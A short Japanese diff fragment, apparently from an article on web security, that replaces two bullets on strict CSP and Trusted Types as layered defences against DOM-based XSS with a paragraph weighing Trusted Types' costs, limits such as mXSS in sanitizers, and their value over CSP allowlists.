-- strict CSP（nonce/hashベース + `strict-dynamic` + `object-src 'none'` + `base-uri 'none'`）は、そもそも攻撃者にスクリプトタグを注入させない「入口側」の防御であり、Trusted Typesという「sink側」の防御と組み合わせることで、DOM XSSに対する多層防御が完成する。
-- LighthouseなどのツールはCSPヘッダーの機械的チェックにより、これらの防御の導入状況を継続的に監視する手段を提供する。
-
+Trusted Typesは万能薬ではありません。既存の巨大なコードベースへの導入コストは高く、default policyに頼りすぎればサニタイズの粒度が粗くなり、そのサニタイザ自体のバグ（mXSSなど）はTrusted Types自体では検出できません。しかし、「DOM-based XSSの発生源をアプリ内の少数の監査可能な地点に強制的に集約する」という設計思想は、CSPのホワイトリストが構造的に抱えていた「回避経路の多さ」という問題（第4章「CSP Is Dead」参照）とは異なる角度からXSSを封じ込める、現時点でもっとも仕組みレベルで筋の良い防御策の一つです。
